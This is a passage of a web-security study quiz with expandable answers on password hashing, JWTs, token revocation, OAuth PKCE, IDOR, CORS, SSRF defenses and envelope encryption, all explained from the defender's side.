<details><summary>Answer</summary>

The per-user salt is right: it defeats precomputed tables and makes identical passwords hash
differently. The problem is that SHA-256 is fast, so an attacker with a leaked table can try
billions of guesses per second per GPU. Use a deliberately slow, tunable password hash — Argon2id
(memory-hard), scrypt, or bcrypt — with parameters stored alongside the hash so the cost can be
raised over time.

</details>

2. Can anyone read the contents of a JWT? What does its signature guarantee?

<details><summary>Answer</summary>

Yes: header and payload are only base64url-encoded, not encrypted, so anyone holding the token can
decode them. The signature guarantees the token was issued by a holder of the signing key and that
header and payload were not modified. It does not guarantee confidentiality or that the token has
not been revoked.

</details>

3. A user clicks "log out of all devices". With JWT access tokens, how do you make that take
   effect quickly?

<details><summary>Answer</summary>

Use short-lived access tokens (minutes) plus server-side refresh tokens: revoke all the user's
refresh tokens so no new access tokens can be issued; existing access tokens expire within their
short lifetime. For immediate effect, also check a denylist of token IDs or a per-user
"invalid before" timestamp on each request, at the cost of a lookup.

</details>

4. In the OAuth authorization code flow with PKCE, what attack does PKCE prevent, and how?

<details><summary>Answer</summary>

It prevents an attacker who intercepts the authorization code (for example via a malicious app
on the same device or a leaked redirect) from exchanging it for tokens. The client creates a
random code_verifier and sends only its SHA-256 hash (code_challenge) in the authorization
request. To redeem the code, the client must present the original verifier, which never passed
through the browser, so the attacker cannot redeem the stolen code.

</details>

5. `GET /api/orders/{id}` returns any order to any logged-in user who knows the ID. Name the bug
   and the fix. Would switching to UUIDs fix it?

<details><summary>Answer</summary>

It is an IDOR (insecure direct object reference), a form of broken access control: the server
authenticates but does not check ownership of the specific object. Fix: on the server, scope the
lookup by the caller's identity from the verified token (e.g. `WHERE id = ? AND account_id = ?`),
ideally centrally in the data-access layer. UUIDs only make guessing harder; leaked or shared IDs
still work, so they are not an access control.

</details>

6. Your API sets `Access-Control-Allow-Origin` to a single trusted origin. Does this stop an
   attacker from calling the API with a stolen token via curl? Why or why not?

<details><summary>Answer</summary>

No. CORS is enforced by browsers, which use it to decide whether a page's script may read a
cross-origin response. Non-browser clients like curl ignore it completely. Protection against
direct calls must come from authentication, authorization, token lifetimes and rate limits.

</details>

7. A "fetch image from URL" feature exists. What attack should you worry about and how do you
   defend against it?

<details><summary>Answer</summary>

SSRF: an attacker supplies internal URLs (cloud metadata at 169.254.169.254, localhost admin
ports, internal services) and your server fetches them from inside the network. Defenses:
allowlist destinations if possible; otherwise resolve and block private, loopback, link-local and
metadata ranges, validating the IP actually connected to (to stop DNS rebinding and redirects);
fetch through an isolated egress proxy without internal network access; harden the metadata
service; do not return raw responses or detailed errors.

</details>

8. Explain envelope encryption and one benefit it gives over sending all data to the KMS.

<details><summary>Answer</summary>

Data is encrypted locally with a randomly generated data key (DEK); the DEK itself is encrypted by
a master key (KEK) that never leaves the KMS, and the encrypted DEK is stored next to the data. To
decrypt, the app asks the KMS to decrypt the DEK, then decrypts the data locally. Benefits: bulk
encryption is fast and does not send large data to the KMS; the master key is never exposed;
rotating the master key only means re-encrypting small DEKs; revoking KMS permission cuts off
access to the data.

</details>
